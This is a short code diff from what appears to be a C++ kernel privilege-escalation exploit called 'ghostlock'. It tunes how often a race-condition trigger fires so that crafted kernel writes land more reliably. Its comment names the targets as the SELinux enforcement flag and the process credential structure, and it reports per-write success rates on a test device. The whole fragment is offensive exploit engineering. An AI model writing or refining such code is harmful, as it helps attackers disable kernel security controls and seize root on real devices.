@@ -194,6 +194,22 @@ namespace ghostlock::race {
                 if (!confirmed && delay_usec > 0) {
                     usleep(static_cast<useconds_t>(delay_usec));
                 }
+                /* Fire budget. Measured on marble under cold-boot isolation
+                 * (rounds-multi-cold): a flat 4 fires per pselect lifted the
+                 * non-leaf writes (W1 selinux_enforcing, W2 task->cred) to 6/7,
+                 * but every W3 write is a leaf write (leaf=1 -> preserve_child=0)
+                 * whose crafted pc is the planted black node -- the first fire
+                 * already re-links that node, and the extra walks then re-enter a
+                 * dangling ghost, which is why W3 fell to 2/6 and took the run
+                 * with it. A leaf write therefore keeps the single fire it always
+                 * had; only the preserve_child writes get the ladder. */
+                const memory::WriteRequest *write_request = race->request;
+                const bool leaf_write =
+                        write_request != nullptr && !write_request->preserve_child;
+                const uint32_t fire_limit =
+                        leaf_write
+                            ? 1U
+                            : session::g_exploit_session.profile.select_consumer_max_calls();
                 for (uint32_t burst = 0;
                      burst < session::g_exploit_session.profile.select_consumer_burst_calls(); burst++) {
                     if (race->consumer_stop.load() ||
@@ -241,8 +257,7 @@ namespace ghostlock::race {
                             calls_this_seq, sched_ret, errno,
                             race->consumer_success.load());
                     support::log_sync();
-                    if (static_cast<uint32_t>(calls_this_seq) >=
-                        session::g_exploit_session.profile.select_consumer_max_calls()) {
+                    if (static_cast<uint32_t>(calls_this_seq) >= fire_limit) {
                         race->consumer_go.store(0);
                         break;
                     }
